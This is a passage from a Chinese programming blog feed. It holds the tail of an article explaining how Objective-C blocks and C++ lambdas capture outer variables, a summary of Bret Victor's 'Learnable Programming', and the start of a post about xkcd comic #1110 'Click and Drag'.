<span class="ez-toc-section" id="2_%E4%BB%8E%E8%AF%AD%E6%B3%95%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F"></span>2. 从语法上看如何修改外部变量<span class="ez-toc-section-end"></span>
</h4>
<p>上面代码中使用了符号<span style="color: #ff0000;">=</span>，通过<span style="color: #808000;">拷贝方式</span>捕获了外部变量i。<br>
但是如果尝试在Lambda表达式中修改变量i：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">auto func = [=] { i = 0; printf("%d\n", i); };
</pre>
<p>会得到错误：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">testLambda.cpp: 在 lambda 函数中:
testLambda.cpp:9:24: 错误：向只读变量‘i’赋值
</pre>
<p>可见<em><span style="color: #808000;">通过拷贝方式捕获的外部变量是只读的</span></em>。Python中也有一个类似的经典case，个人觉得有相通之处：</p>
<p></p>
<pre data-enlighter-language="python" class="EnlighterJSRAW">x = 10
def foo():
    print(x)
    x += 1
foo()
</pre>
<p>这段代码会抛出<span style="color: #ff0000;">UnboundLocalError</span>错误，原因可以参见<a href="https://docs.python.org/faq/programming.html#why-am-i-getting-an-unboundlocalerror-when-the-variable-has-a-value" target="_blank">FAQ</a>。</p>
<p>在C++的闭包语法中，如果需要对外部变量的写权限，可以使用符号<span style="color: #ff0000;">&amp;</span>，通过<span style="color: #808000;"><em>引用方式</em></span>捕获：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int i = 1024;
auto func = [&amp;] { i = 0; printf("%d\n", i); };
func();
</pre>
<p>反过来，将修改外部变量的逻辑放到Objective-C代码中：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int i = 1024;
void (^blk)(void) = ^{ i = 0; printf("%d\n", i); };
blk();
</pre>
<p>会得到如下错误：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">main.m:14:29: error: variable is not assignable (missing __block type specifier)
    void (^blk)(void) = ^{ i++; printf("%d\n", i); };
                           ~^
1 error generated.
</pre>
<p>可见在block的语法中，默认捕获的外部变量也是只读的，如果要修改外部变量，需要使用<span style="color: #ff0000;">__block</span>类型指示符进行修饰。<br>
为什么呢？请继续往下看 ：）</p>
<h4>
<span class="ez-toc-section" id="3_%E4%BB%8E%E5%AE%9E%E7%8E%B0%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E6%8D%95%E8%8E%B7%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F"></span>3. 从实现上看如何捕获外部变量<span class="ez-toc-section-end"></span>
</h4>
<p>闭包对于编程语言来说是一种语法糖，包括Block和Lambda，是为了方便程序员开发而引入的。因此，对Block特性的支持会落地在<span style="color: #808000;"><em>编译器前端</em></span>，中间代码将会是C语言。</p>
<p>先看如下代码会产生怎样的中间代码。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main(int argc, const char * argv[])
{
    int i = 1024;
    void (^blk)(void) = ^{ printf("%d\n", i); };
    blk();

    return 0;
}
</pre>
<p>首先是<span style="color: #ff0000;">block结构体</span>的实现：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#ifndef BLOCK_IMPL
#define BLOCK_IMPL
struct __block_impl {
    void *isa;
    int Flags;
    int Reserved;
    void *FuncPtr;
};
// 省略部分代码

#endif
</pre>
<p>第一个成员<span style="color: #ff0000;">isa</span>指针用来表示该结构体的类型，使其仍然处于Cocoa的对象体系中，类似Python对象系统中的PyObject。</p>
<p>第二、三个成员是标志位和保留位。</p>
<p>第四个成员是对应的“匿名函数”，在这个例子中对应函数：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static void __main_block_func_0(struct __main_block_impl_0 *__cself) {
    int i = __cself-&gt;i; // bound by copy
    printf("%d\n", i);
}
</pre>
<p>函数__main_block_func_0引入了参数<span style="color: #808000;">__cself</span>，为struct __main_block_impl_0 *类型，从参数名称就可以看出它的功能类似于C++中的this指针或者Objective-C的self。<br>
而struct __main_block_impl_0的结构如下：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct __main_block_impl_0 {
    struct __block_impl impl;
    struct __main_block_desc_0* Desc;
    int i;
    __main_block_impl_0(void *fp, struct __main_block_desc_0 *desc, int _i, int flags=0) : i(_i) {
        impl.isa = &amp;_NSConcreteStackBlock;
        impl.Flags = flags;
        impl.FuncPtr = fp;
        Desc = desc;
    }
};
</pre>
<p>从__main_block_impl_0这个名称可以看出该结构体是为main函数中第零个block服务的，即示例代码中的blk；也可以猜到不同场景下的block对应的结构体不同，但本质上第一个成员一定是<span style="color: #808000;">struct __block_impl impl</span>，因为这个成员是block实现的基石。</p>
<p>结构体__main_block_impl_0又引入了一个新的结构体，也是中间代码里最后一个结构体：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static struct __main_block_desc_0 {
    unsigned long reserved;
    unsigned long Block_size;
} __main_block_desc_0_DATA = { 0, sizeof(struct __main_block_impl_0)};
</pre>
<p>可以看出，这个描述性质的结构体包含的价值信息就是struct __main_block_impl_0的大小。</p>
<p>最后剩下main函数对应的中间代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main(int argc, const char * argv[])
{
    int i = 1024;
    void (*blk)(void) = (void (*)(void))&amp;__main_block_impl_0((void *)__main_block_func_0, &amp;__main_block_desc_0_DATA, i);
    ((void (*)(struct __block_impl *))((struct __block_impl *)blk)-&gt;FuncPtr)((struct __block_impl *)blk);

    return 0;
}
</pre>
<p>从main函数对应的中间代码可以看出<span style="color: #ff0000;">执行block的本质</span>就是<span style="color: #808000;">以block结构体自身作为__cself参数</span>，这里对应__main_block_impl_0，<span style="color: #808000;">通过结构体成员FuncPtr函数指针调用对应的函数</span>，这里对应__main_block_func_0。</p>
<p>其中，局部变量i是以<span style="color: #808000;">值传递</span>的方式拷贝一份，作为__main_block_impl_0的构造函数的参数，并以初始化列表的形式赋值给其成员变量i。所以，基于这样的实现，不允许直接修改外部变量是合理的——因为按值传递根本改不到外部变量。</p>
<h4>
<span class="ez-toc-section" id="4_%E4%BB%8E%E5%AE%9E%E7%8E%B0%E4%B8%8A%E7%9C%8B%E5%A6%82%E4%BD%95%E4%BF%AE%E6%94%B9%E5%A4%96%E9%83%A8%E5%8F%98%E9%87%8F%EF%BC%88_block%E7%B1%BB%E5%9E%8B%E6%8C%87%E7%A4%BA%E7%AC%A6%EF%BC%89"></span>4. 从实现上看如何修改外部变量（<span style="color: #ff0000;">__block</span>类型指示符）<span class="ez-toc-section-end"></span>
</h4>
<p>如果想要修改外部变量，则需要用<span style="color: #ff0000;">__block</span>来修饰：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main(int argc, const char * argv[])
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i = 0; printf("%d\n", i); };
    blk();

    return 0;
}
</pre>
<p>此时再看中间代码，发现多了一个结构体：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct __Block_byref_i_0 {
    void *__isa;
    __Block_byref_i_0 *__forwarding;
    int __flags;
    int __size;
    int i;
};
</pre>
<p>于是，用__block修饰的int变量<span style="color: #808000;">i化身为</span>__Block_byref_i_0结构体的最后一个<span style="color: #808000;">成员变量</span>。</p>
<p>代码中blk对应的结构体也发生了变化：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">struct __main_block_impl_0 {
    struct __block_impl impl;
    struct __main_block_desc_0* Desc;
    __Block_byref_i_0 *i; // by ref
    __main_block_impl_0(void *fp, struct__main_block_desc_0 *desc, __Block_byref_i_0 *_i, int flags=0) : i(_i-&gt;__forwarding) {
        impl.isa = &amp;_NSConcreteStackBlock;
        impl.Flags = flags;
        impl.FuncPtr = fp;
        Desc = desc;
    }
};
</pre>
<p>__main_block_impl_0发生的变化就是int类型的成员变量i换成了__Block_byref_i_0 *类型，从名称可以看出现在要通过引用方式来捕获了。</p>
<p>对应的函数也不同了：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static void __main_block_func_0(struct  __main_block_impl_0 *__cself) {
    __Block_byref_i_0 *i = __cself-&gt;i; // bound by ref
    (i-&gt;__forwarding-&gt;i) = 0; // 看起来很厉害的样子
    printf("%d\n", (i-&gt;__forwarding-&gt;i));
}
</pre>
<p>main函数也有了变动：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">int main(int argc, const char * argv[])
{
    __block __Block_byref_i_0 i = {(void*)0,(__Block_byref_i_0 *)&amp;i, 0, sizeof(__Block_byref_i_0), 1024};
    void (*blk)(void) = (void (*)(void))&amp;__main_block_impl_0((void *)__main_block_func_0, &amp;__main_block_desc_0_DATA, (struct __Block_byref_i_0 *)&amp;i, 570425344);
    ((void (*)(struct __block_impl *))((struct __block_impl *)blk)-&gt;FuncPtr)((struct __block_impl *)blk);

    return 0;
}
</pre>
<p>前两行代码创建了两个关键结构体，特地高亮显示。</p>
<p>这里没有看__main_block_desc_0发生的变化，<em><span style="color: #808000;">放到后面讨论</span></em>。</p>
<p>使用<span style="color: #ff0000;">__block类型指示符的本质</span>就是引入了__Block_byref_<span style="color: #ff0000;">{$var_name}</span>_<span style="color: #ff0000;">{$index}</span>结构体，而被__block关键字修饰的变量就被放到这个结构体中。另外，block结构体通过引入__Block_byref_{$var_name}_{$index}指针类型的成员，得以间接访问到外部变量。</p>
<p>通过这样的设计，我们就可以修改外部作用域的变量了，再一次应了那句话：</p>
<blockquote><p>There is no problem in computer science that can’t be solved by adding another level of indirection.</p></blockquote>
<p>指针是我们最经常使用的间接手段，而这里的本质也是通过指针来间接访问，为什么要特地引入__Block_byref_{$var_name}_{$index}结构体，而不是直接使用int *来访问外部变量i呢？</p>
<p>另外，__Block_byref_{$var_name}_{$index}结构体中的<span style="color: #ff0000;">__forwarding</span>指针成员有何作用？</p>
<p>请继续往下看 ：）</p>
<h4>
<span class="ez-toc-section" id="5_%E8%83%8C%E5%90%8E%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%8A%A8%E4%BD%9C"></span>5. 背后的内存管理动作<span class="ez-toc-section-end"></span>
</h4>
<p>在Objective-C中，block特性的引入是<em><span style="color: #808000;">为了让程序员可以更简洁优雅地编写并发代码</span></em>（配合看起来像敏感词的GCD）。比较常见的就是将block作为函数参数传递，以供后续回调执行。</p>
<p>先看一段完整的、可执行的代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#import &lt;Foundation/Foundation.h&gt;
#include &lt;pthread.h&gt;

typedef void (^DemoBlock)(void);

void test();
void *testBlock(void *blk);

int main(int argc, const char * argv[])
{
    printf("Before test()\n");
    test();
    printf("After test()\n");

    sleep(5);
    return 0;
}

void test()
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i = 2048; printf("%d\n", i); };

    pthread_t thread;
    int ret = pthread_create(&amp;thread, NULL, testBlock, (void *)blk);
    printf("thread returns : %d\n", ret);

    sleep(3); // 这里睡眠1s的话，程序会崩溃
}

void *testBlock(void *blk)
{
    sleep(2);

    printf("testBlock : Begin to exec blk.\n");
    DemoBlock demoBlk = (DemoBlock)blk;
    demoBlk();

    return NULL;
}
</pre>
<p>在这个示例中，位于test()函数的block类型的变量blk就作为函数参数传递给testBlock。</p>
<p>正常情况下，这段代码可以成功运行，输出：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Before test()
thread returns : 0
testBlock : Begin to exec blk.
2048
After test()
</pre>
<p>如果按照注释，将test()函数最后一行改为休眠1s的话，正常情况下程序会在输出如下结果后崩溃：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Before test()
thread returns : 0
After test()
testBlock : Begin to exec blk.
</pre>
<p>从输出可以看出，当要执行blk的时候，test()已经执行完毕回到main函数中，对应的<span style="color: #808000;">函数栈也已经展开</span>，此时栈上的变量已经不存在了，继续访问导致崩溃——这也是不用int *直接访问外部变量i的原因。</p>
<h5>
<span class="ez-toc-section" id="51_%E6%8B%B7%E8%B4%9Dblock%E7%BB%93%E6%9E%84%E4%BD%93"></span>5.1 拷贝block结构体<span class="ez-toc-section-end"></span>
</h5>
<p>上文提到block结构体__block_impl的第一个成员是isa指针，使其成为NSObject的子类，所以我们可以通过相应的<span style="color: #808000;">内存管理机制</span>将其拷贝到堆上：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void test()
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i = 2048; printf("%d\n", i); };

    pthread_t thread;
    int ret = pthread_create(&amp;thread, NULL, testBlock, (void *)[blk copy]);
    printf("thread returns : %d\n", ret);

    sleep(1);
}

void *testBlock(void *blk)
{
    sleep(2);

    printf("testBlock : Begin to exec blk.\n");
    DemoBlock demoBlk = (DemoBlock)blk;
    demoBlk();
    [demoBlk release];

    returnNULL;
}
</pre>
<p>再次执行，得到输出：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">Before test()
thread returns : 0
After test()
testBlock : Begin to exec blk.
2048
</pre>
<p>可以看出，在test()函数栈展开后，demoBlk仍然可以成功执行，这是由于blk对应的block结构体__main_block_impl_0已经在堆上了。<span style="color: #808000;">不过这还不够</span>——</p>
<h5>
<span class="ez-toc-section" id="52_%E6%8B%B7%E8%B4%9D%E6%8D%95%E8%8E%B7%E7%9A%84%E5%8F%98%E9%87%8F%EF%BC%88_block%E5%8F%98%E9%87%8F%EF%BC%89"></span>5.2 拷贝捕获的变量（<span style="color: #ff0000;">__block</span>变量）<span class="ez-toc-section-end"></span>
</h5>
<p>在拷贝block结构体的同时，还会将捕获的<span style="color: #ff0000;">__block</span>变量，即结构体__Block_byref_i_0，复制到堆上。这个任务落在前面没有讨论的__main_block_desc_0结构体身上：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">static void __main_block_copy_0(struct __main_block_impl_0*dst, struct __main_block_impl_0*src) {_Block_object_assign((void*)&amp;dst-&gt;i, (void*)src-&gt;i, 8/*BLOCK_FIELD_IS_BYREF*/);}

static void __main_block_dispose_0(struct __main_block_impl_0*src) {_Block_object_dispose((void*)src-&gt;i, 8/*BLOCK_FIELD_IS_BYREF*/);}

static struct __main_block_desc_0 {
    unsigned long reserved;
    unsigned long Block_size;
    void (*copy)(struct __main_block_impl_0*, struct __main_block_impl_0*);
    void (*dispose)(struct __main_block_impl_0*);
} __main_block_desc_0_DATA = { 0, sizeof(struct __main_block_impl_0), __main_block_copy_0, __main_block_dispose_0};
</pre>
<p>栈上的__main_block_impl_0结构体为src，堆上的__main_block_impl_0结构体为dst，当发生复制动作时，__main_block_copy_0函数会得到调用，将src的成员变量i，即__Block_byref_i_0结构体，也<span style="color: #808000;">复制到堆上</span>。</p>
<h5>
<span class="ez-toc-section" id="53_forwarding%E6%8C%87%E9%92%88%E7%9A%84%E4%BD%9C%E7%94%A8"></span>5.3 __forwarding指针的作用<span class="ez-toc-section-end"></span>
</h5>
<p>当复制动作完成后，<span style="color: #808000;">栈上和堆上都存在</span>着__main_block_impl_0结构体。如果栈上、堆上的block结构体都对捕获的外部变量进行操作，会如何？</p>
<p>下面是一段示例代码：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">void test()
{
    __block int i = 1024;
    void (^blk)(void) = ^{ i++; printf("%d\n", i); };

    pthread_t thread;
    int ret = pthread_create(&amp;thread, NULL, testBlock, (void *)[blk copy]);
    printf("thread returns : %d\n", ret);

    sleep(1);
    blk();
}

void *testBlock(void *blk)
{
    sleep(2);

    printf("testBlock : Begin to exec blk.\n");
    DemoBlock demoBlk = (DemoBlock)blk;
    demoBlk();
    [demoBlk release];

    returnNULL;
}
</pre>
<ol>
<li>在test()函数中调用pthread_create创建线程时，<span style="color: #808000;">blk被复制了一份到堆上</span>作为testBlock函数的参数。</li>
<li>test()函数中的<span style="color: #808000;">blk结构体位于栈中，在休眠1s后被执行</span>，对i进行自增动作。</li>
<li>testBlock函数在休眠2s后，<span style="color: #808000;">执行位于堆上的block结构体</span>，这里为demoBlk。</li>
</ol>
<p>上述代码执行后输出：</p>
<p></p>
<pre data-enlighter-language="shell" class="EnlighterJSRAW">Before test()
thread returns : 0
1025
After test()
testBlock : Begin to exec blk.
1026
</pre>
<p>可见无论是栈上的还是堆上的block结构体，修改的都是<span style="color: #808000;">同一个__block变量</span>。</p>
<p>这就是前面提到的__forwarding指针成员的作用了：</p>
<p><span style="color: #ff0000;">起初</span>，栈上的__block变量的成员指针__forwarding指向__block变量本身，即栈上的__Block_byref_i_0结构体。</p>
<p><span style="color: #ff0000;">当__block变量被复制到堆上后</span>，栈上的__block变量的__forwarding成员会指向堆上的那一份拷贝，从而保持一致。</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A"></span>参考资料：<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://msdn.microsoft.com/en-us/library/dd293603.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd293603.aspx</a></li>
<li><a href="http://www.cprogramming.com/c++11/c++11-lambda-closures.html" target="_blank">http://www.cprogramming.com/c++11/c++11-lambda-closures.html</a></li>
<li><a href="https://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/Blocks/Articles/00_Introduction.html" target="_blank">http://developer.apple.com/library/ios/#documentation/cocoa/Conceptual/Blocks/Articles/00_Introduction.html</a></li>
<li><a href="https://en.wikipedia.org/wiki/Closure_(computer_science)" target="_blank">http://en.wikipedia.org/wiki/Closure_(computer_science)</a></li>
</ul>
<p></p>
 ]]></content>
<pubDate>2012-09-20T08:17:07+08:00</pubDate>
<guid>https://coolshell.cn/articles/8309.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Bret Victor – Learnable Programming ]]></title>
<link>https://coolshell.cn/articles/8387.html</link>
<content><![CDATA[ 
<p>大家是否还记得之前酷壳向大家介绍的苹果设计师<a href="http://worrydream.com/" target="_blank">Bret Victor</a>一种可视编程的视频《<a href="https://coolshell.cn/articles/6775.html" rel="bookmark">Bret Victor – Inventing on Principle</a>》，最近，他写了一篇文章——<a href="http://worrydream.com/LearnableProgramming/" target="_blank"> Learnable Programming</a>，写这篇文章的原因是因为“可汗学院(Khan Academy)”近期上线的一个<a href="https://www.khanacademy.org/cs" target="_blank">在线编程环境</a>，根据他的演讲提供了一堆基于Javascript的“实时编程”的环境，因为这个环境是<a href="http://ejohn.org/blog/introducing-khan-cs" target="_blank">引用了他的想法</a>，所以，他有必要出来喷两句。</p>
<p>这篇文章的开头就是一个问题——“<em>How do we get people to understand programming?</em>”，我们怎么让人们懂得编程？</p>
<p><img alt="image placeholder" ></p>
<p>然后，他说了两条——</p>
<ul>
<li>
<strong>编程是一种思考，而不是一种死记硬背的技能！</strong>你学会了“for循环”并不是说你就学会了编程，这就好像你知道有铅笔这个东西，但是你对绘画还是什么不懂。（对于这一条，正好这两天我在微博上和人辩论“<a href="https://weibo.com/1401880315/yFQkJn8bC" target="_blank">基础算法面试题是否好</a>”（还有<a href="https://weibo.com/1401880315/yFOeyy00M" target="_blank">微博一</a>，<a href="https://weibo.com/1401880315/z06Y0qMGf" target="_blank">微博二</a>），而且我以前也写过一篇《<a title="为什么我反对纯算法面试题" href="https://coolshell.cn/articles/8138.html" target="_blank">为什么我反对纯算法面试</a>》，这里借用Bret的话再加强一下我的观点——“<strong>我们一方面在骂中国的应试教育毁了学生，另一方面我们又在把我们的面试变成“考八股文”式的考试！  你会qsort有什么用？你只不过是会用一支高级铅笔而已罢了。</strong>”）</li>
</ul>
<ul>
<li>
<strong>人只有看得见，才能理解。</strong>如果一个程序员不能看到他的程序在干什么，那么她就不能理解程序。（对于这一条，让我想到了Donald Knuth的话——“An algorithm must be seen to be believe!”）</li>
</ul>
<p>所以，Bret 觉得编程软件的目标是——</p>
<p><span id="more-8387"></span></p>
<ul>
<li>支持并激发强大的思考。 To support and encourage powerful ways of thinking.</li>
<li>让程序员可以看得见程序的运行过程。To enable programmers to see and understand the execution of their programs</li>
</ul>
<p>他说，可汗学院的“实时编程环境”并没有达到上面的任何一个目标。他还说用Javascript这样设计得很垃圾的语言根本不能支持强大的思考，而且还忽略了近十年来的成果，可汗学院这些东西完全是毫无价值的。</p>
<p>Bret认为，Alan Perlis的名言——“要学会编程，你必需得同时变成机器和程序”是错误的，这句被广为流传的错误名言，让我们把编程变成很难，并且掩盖了编程的艺术。人并不是一台机器，我们也不应该强迫自己变成那样。</p>
<p>接下来，他说明了一个编程系统应该有两个部分——</p>
<ul>
<li><strong>编程的“环境”，是其中一部分需要安装在电脑上的。</strong></li>
</ul>
<ul>
<li><strong>编程的“语言”，是另一部分需要安装在程序员大脑里的。</strong></li>
</ul>
<p>他随笔给出来了一些Design Principles——</p>
<p>对于“<strong>编程环境</strong>”，应该能让学习者干下面的事：</p>
<ul>
<li>
<strong>阅读程序词汇 read the vocabulary</strong> <em>— </em>这些单词意味着什么？是不是显而易见不用思考的？是不是很自然地被上下文解释了？</li>
</ul>
<ul>
<li>
<strong>跟进流程 follow the flow</strong> <em>— </em>在什么时候会发生什么？流程的时间过程是不是看得见摸得着的？流程的粒度是否有意义？</li>
</ul>
<ul>
<li>
<strong>看见状态 see the state</strong> <em>— </em>电脑在想些什么？你能不能看到电脑里的数据？并可以看到不同状态的比较？没有任何状态会隐藏？</li>
</ul>
<ul>
<li>
<strong>通过交互来创造代码 create by reacting</strong> <em>— </em>从粗糙开始，然后开始雕琢程序。交互是否实时显示在屏幕上？有多少组件我可以用来做实时交互？</li>
</ul>
<ul>
<li>
<strong>通过抽像来创造代码 create by abstracting</strong> <em>— </em>从一些hard code开始，然后开始抽象成变量<em>，</em>抽象成公式，抽象成函数。从一个开始作模板，然后做多个不同的东西。</li>
</ul>
<p>对于“<strong>编程语言</strong>” 来说，它应该提供下面的事：</p>
<ul>
<li>
<strong>同一性和比方 identity and metaphor</strong> <em>— </em>我怎么把电脑的世界和我的世界联系起来?<em> </em>推荐了一本书《<em><a href="http://books.google.com/books?id=HhIEAgUfGHwC&amp;printsec=frontcover">“Mindstorms”</a></em>》</li>
</ul>
<ul>
<li>
<strong>分解 decomposition</strong> <em>— </em>怎么把我的想法分解成碎片？<em>how do I break down my thoughts into mind-sized pieces?</em>
</li>
<li>
<strong>重组 recomposition</strong> <em>— </em>怎么把这些碎片重组起来？<em> how do I glue pieces together?</em>
</li>
<li>
<strong>可读性 readability</strong> <em>— </em>这一大堆程序单词是什么意思？<em>what do these words mean?</em>
</li>
</ul>
<p>然后，他说“The Features are not the point”，<strong>我们很多时候会关注编程环境和编程语言提供的功能，这就好像我们在看一本书有哪些单词一样，有哪些单词不重要，重要的是我这些单词组合起来传达了一个什么信息</strong>？<strong>一个设计的好的系统并不是一堆功能，一个设计得好的编程环境是激发特定的思考方式</strong>。所有的功能都是非常小心翼翼地组合起来为之服务。（不好意思，我又要插一句。我觉得这和我在《<a title="抄袭，腾讯 和 产品" href="https://coolshell.cn/articles/7617.html" target="_blank">抄袭，腾讯和产品</a>》一文中，我所理解的“什么是真正的产品”有点类似——真正的产品不是功能的组合，而是要表达的价值和对某一特定问题端到端的解决方案）</p>
<p>接下来，Bret用大量的示例告诉了大家上面所说的那几条是具体是什么。大家一定要去读一读！（我把这些东西总结果在上面的那些条目中了）</p>
<p>最后，Bret说了一下，他被问过很多次——这些漂亮的想法怎么应用到现实世界中？他说这个问题问的是对的，但是这些问题问的就好像是——“怎么能让一匹马从内燃机引擎受益”一样，其假设的改变是错误的。他回答到，更准确的是——“<strong>Programming has to work like this</strong>”，所以他说，他的这些东西不是一种“Training”，也不是一种“银弹”，只不过是拿开了眼罩。</p>
<p><strong>更新：</strong>一楼回复的朋友给了一个中译版的链接：<a href="http://chengyichao.info/learnable-programming/">http://chengyichao.info/learnable-programming/</a></p>
<p>(全文完)</p>
 ]]></content>
<pubDate>2012-10-14T16:37:04+08:00</pubDate>
<guid>https://coolshell.cn/articles/8387.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ xkcd 神图“Click and Drag” ]]></title>
<link>https://coolshell.cn/articles/8398.html</link>
<content><![CDATA[ 
<p><a href="https://xkcd.com/" target="_blank">xkcd</a>对于经常浏览国外网站的朋友一定不会陌生。不过，还是先让我来介绍一下xkcd（<a href="https://en.wikipedia.org/wiki/Xkcd" target="_blank">维基百科词条</a>）。这是一个漫画网站，它主要是发布一些很简单的随手画的漫画，它主要有四种体裁——浪漫、讽刺、数学 和 语言。也会经常出现一些和IT有关的漫画，比如下面这个漫画—— （懂Unix的人一眼就看懂了，不懂的怎么看也看不懂）</p>
<p><img alt="image placeholder" ></p>
<p>本质上来说，xkcd是一种Geek文化，里面的东西都非常的Geek和晦涩，讽刺很辛辣，但很多只有特定人群可以看得懂。而且表达的形式自由到天马行空，飘忽不定。</p>
<p><span id="more-8398"></span></p>
<p>xkcd.com的网站创建者、所有的漫画的作者叫<a title="Randall Munroe" href="https://en.wikipedia.org/wiki/Randall_Munroe">Randall Munroe</a><img alt="image placeholder" >，他以前在 NASA工作，是那里的Roboticist——机器人专家，80后，同样，也是一个程序员。他还会画漫画。</p>
<p>xkcd是他于2005年创建的，他本来只是想把他大学里在记事本里画的漫画放到他的个人主页上，但结果却搞成了一个独立的以漫画为主的网站，他用他画的这些漫画做成T恤卖。为什么要取名叫xkcd，据Munroe说，这四个字母，没有任何意义，就是为了让人不能把他们通过拼成一个单词读出来。现在他全职在搞xkcd.com。他现在一周会更新三次漫画，分别在周一，周三，和周五。</p>
<p>到了2007年5月，xkcd上的漫画才被广泛转载。2008年10月， <em><a title="The New Yorker" href="https://en.wikipedia.org/wiki/The_New_Yorker">The New Yorker</a></em> 杂志对Munroe做了一个采访。</p>
<p>2010年3月，xkcd的书里的<a href="http://forums.xkcd.com/viewtopic.php?p=2042913#p2042829" target="_blank">谜底被解决了</a>，Munroe在旧金山的金门大桥公园里给他的Fans发了255本限量版的书。</p>
<p>2012年4月1日愚人节，他的1037 号漫画(“Umwelt”) 会根据不同的IP，浏览器和地址显示不同的漫画。</p>
<p>2012年9月19号，xkcd的第1110号图问世了。</p>
<h4>XKCD #1110 神图</h4>
<p>这个图上面就是三格小漫画，一个小人拿着气球，还有两句耐人寻味的话。而<strong>这三格漫画图的下面是一个风景图，取名 Click and Drag，也就是让你点住图片拖动。于是你就不能自拔了。</strong></p>
<p>我只所以在前面写了那么多东西，而不是把这个链接放在一开始，就是害怕你点了这个图，就再也不回来了。</p>
<p>好了，现在你可以点下面的链接开这个神图了 （你会发现这个图怎么也拖不完，无穷完尽的，所以，还请你先回来）<strong></strong></p>
<p style="text-align: center; font-size: 24px;"><strong> <a href="https://www.xkcd.com/1110/" target="_blank">Click and Drag</a></strong></p>
<p style="text-align: center;"><strong><span style="color: #cc0000;">但请你一定还要回来，本文后面还有精彩内容!</span></strong></p>
<p><strong>这个图一发布，几乎全世界的各大论坛都在疯狂的转载，很多媒体都关注这个漫画，各种技术社区如：reddit 在疯狂地讨论着这个图是怎么实现的，有多大？还有很多人再分析这个图里的内容，这个图里隐藏着很多很有意思的东西，《有2001太空漫游》，有《星球大战》，还有《超级马丽》等等。</strong></p>
<p style="text-align: center;"><strong>几乎整个互联网都沸腾了，但好像中国社区对此事完全不知。</strong></p>
<p>网上出现了很多相关的blog和站点来分析这个图片。如果你在Google里搜xkcd 1110，你会发现很多内容。</p>
<h4>这个图有多大</h4>
<ul>
<li>这个图可以分解成 2592 个 2048 x 2048 像素的图。</li>
</ul>
<ul>
<li>但其中只有 225 个 2048 x 2048 的PNG 图片文件。而剩下的2337 基本上是纯黑的或是纯白的块。比如地下和天空。</li>
</ul>
<ul>
<li>整个图横向有81个2048 x 2048的图（左边有33个，右边有48个），纵向有32个 2048 x 2048个图（天上有13个，地下有19个）</li>
</ul>
<ul>
<li>老大当晚Release的全尺寸的大图（比现在你看到的还要大），不算空白处，图片共有60G的像素，而如果要算上整个图将会是T级别的像素。现在你看到版本已被做过优化，不算空白处，只有1G的像素，而算上全图有10G的像素。 (2048x2048x225 = 943,718,400 和 2048x2048x2592 = 10,871,635,968).</li>
</ul>
<ul>
<li>如果我们按比例来看的话，图中的32个象素对应于现实世界的5英尺，那么，这个图的宽有25920英尺（7.9公里），高有10240英尺（3.1公里）。</li>
</ul>
<ul>
<li>如果每个 2048 x 2048 的PNG图可以被打印成一个300 dpi的宣传画，那么，这个宣传画基本上是14.05米宽，5.55米高的图。现在的PNG被调整过了，只有72dpi左右。</li>
</ul>
<p>有人说，创作这么这个大图很费时间。不过我觉得这对于Geek来说不是问题，因为这应该是可以通过矢量图的拼装来搞定。</p>
<figure id="attachment_8400" aria-describedby="caption-attachment-8400" style="width: 645px" class="wp-caption aligncenter"><a href="https://coolshell.cn/wp-content/uploads/2012/10/xkcd1110.png"><img alt="image placeholder" ></a><figcaption id="caption-attachment-8400" class="wp-caption-text">xkcd 1110全景缩略图（点击看大缩略图）</figcaption></figure>
<h4>看看技术宅们干了什么</h4>
<p>下面我只记录了些不完全的技术宅们的因为这个画搞出来的东西。大家可以补充。</p>
<p style="padding-left: 30px;">1）如果你用鼠标翻得不爽的话，你可以<a href="http://www.potch.me/blog/press-and-hold.html" target="_blank">看看这篇文章</a>，在你的Chrome下按Ctrl+Shift+I，然后到Javascript控制台里，粘贴文中的代码，于是，你就可以用键盘的光标键移动并浏览整个世界了。</p>
<p style="padding-left: 30px;">2）这是个全屏版的：<a href="http://ares.aylett.co.uk/xkcd/" rel="nofollow">http://ares.aylett.co.uk/xkcd/</a></p>
